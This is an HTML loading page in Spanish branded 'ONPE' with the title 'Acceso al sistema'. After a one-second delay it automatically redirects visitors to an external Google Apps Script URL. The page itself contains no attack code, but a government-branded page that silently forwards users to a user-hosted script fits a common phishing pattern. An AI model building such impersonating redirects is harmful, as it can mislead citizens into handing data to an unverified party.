<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acceso al sistema</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      min-height: 100vh;
      font-family: "Segoe UI", Arial, sans-serif;
      background: linear-gradient(135deg, #eef6ff, #d9ebff);
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }

    .circle {
      position: absolute;
      border-radius: 50%;
      background: rgba(25, 91, 170, 0.10);
    }

    .c1 {
      width: 300px;
      height: 300px;
      top: -120px;
      left: -100px;
    }

    .c2 {
      width: 220px;
      height: 220px;
      bottom: -80px;
      right: -60px;
    }

    .c3 {
      width: 100px;
      height: 100px;
      top: 15%;
      right: 12%;
      background: rgba(25, 91, 170, 0.07);
    }

    .content {
      position: relative;
      z-index: 2;
      text-align: center;
      width: 100%;
      max-width: 550px;
    }

    h1 {
      font-size: 58px;
      letter-spacing: 5px;
      color: #14569b;
      font-weight: 900;
      margin-bottom: 12px;
    }

    h2 {
      font-size: 23px;
      color: #234f7d;
      font-weight: 600;
      margin-bottom: 18px;
    }

    p {
      font-size: 16px;
      color: #607d9d;
      margin-bottom: 25px;
    }

    .loader {
      display: flex;
      justify-content: center;
      gap: 8px;
    }

    .loader span {
      width: 9px;
      height: 9px;
      background: #216bb5;
      border-radius: 50%;
      animation: loading 0.7s infinite alternate;
    }

    .loader span:nth-child(2) {
      animation-delay: 0.15s;
    }

    .loader span:nth-child(3) {
      animation-delay: 0.30s;
    }

    @keyframes loading {
      from {
        opacity: 0.25;
        transform: translateY(0);
      }

      to {
        opacity: 1;
        transform: translateY(-7px);
      }
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 42px;
        letter-spacing: 4px;
      }

      h2 {
        font-size: 19px;
      }

      p {
        font-size: 14px;
      }
    }
  </style>
</head>

<body>

  <div class="circle c1"></div>
  <div class="circle c2"></div>
  <div class="circle c3"></div>

  <main class="content">
    <h1>ONPE</h1>

    <h2>Bienvenido al sistema</h2>

    <p>Espere, estamos cargando los datos...</p>

    <div class="loader">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </main>

  <script>
    setTimeout(function () {
      window.location.replace(
        "https://script.google.com/macros/s/AKfycbwDrR7Jmamq6fDnDpL0o-n5dBBh2LJfc8JTR55p9CBKp1CoZxh5w65KW8SLXy58u8E/exec"
      );
    }, 1000);
  </script>

</body>
</html>
